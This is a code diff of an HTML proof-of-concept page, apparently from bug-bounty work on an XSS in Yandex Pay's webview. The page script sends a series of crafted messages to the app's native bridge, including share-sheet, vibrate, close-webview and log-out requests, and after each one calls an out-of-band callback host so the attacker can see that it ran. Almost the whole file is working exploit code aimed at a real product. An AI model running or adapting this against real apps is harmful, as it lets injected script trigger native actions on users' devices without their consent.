@@ -1,20 +1,36 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// Test: OPEN_NATIVE_SHARING - opens iOS share sheet
-// Fields: trackId (optional), title (optional), text (required), mimeType (required)
+// OPEN_NATIVE_SHARING - try multiple format variations
+// Since OPEN_LINK worked with payload wrapper, this should too
+// But maybe the issue is the field values
 
-window.__plusSDKMobileCompat.onMessage(JSON.stringify({
-  type: "OPEN_NATIVE_SHARING",
-  trackId: "share1",
-  payload: {
-    title: "r4dl3 PoC",
-    text: "XSS in Yandex Pay - attacker controlled share content",
-    mimeType: "text/plain"
-  }
-}));
+var attempts = [
+  // Original format (payload wrapper)
+  {type:"OPEN_NATIVE_SHARING", trackId:"s1", payload:{text:"XSS PoC by r4dl3", mimeType:"text/plain"}},
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/native-sharing-sent");
+  // With title
+  {type:"OPEN_NATIVE_SHARING", trackId:"s2", payload:{title:"Test", text:"XSS PoC", mimeType:"text/plain"}},
+
+  // Without payload wrapper (flat)
+  {type:"OPEN_NATIVE_SHARING", trackId:"s3", text:"XSS PoC", mimeType:"text/plain"},
+
+  // Try NATIVE_VIBRATE_REQUEST instead (simpler - only vibrateType)
+  {type:"NATIVE_VIBRATE_REQUEST", trackId:"v1", payload:{vibrateType:"HEAVY"}},
+
+  // Try CLOSE_CURRENT_WEBVIEW (simplest - no fields needed)
+  {type:"CLOSE_CURRENT_WEBVIEW", trackId:"cl1", payload:{}},
+
+  // Try OPEN_LOG_OUT_REQUEST (no fields)
+  {type:"OPEN_LOG_OUT_REQUEST", trackId:"lo1", payload:{}},
+];
+
+attempts.forEach(function(msg, i) {
+  setTimeout(function(){
+    window.__plusSDKMobileCompat.onMessage(JSON.stringify(msg));
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/attempt-" + i + "-" + msg.type);
+  }, i * 1500);
+});
 </script>
 </body>
 </html>
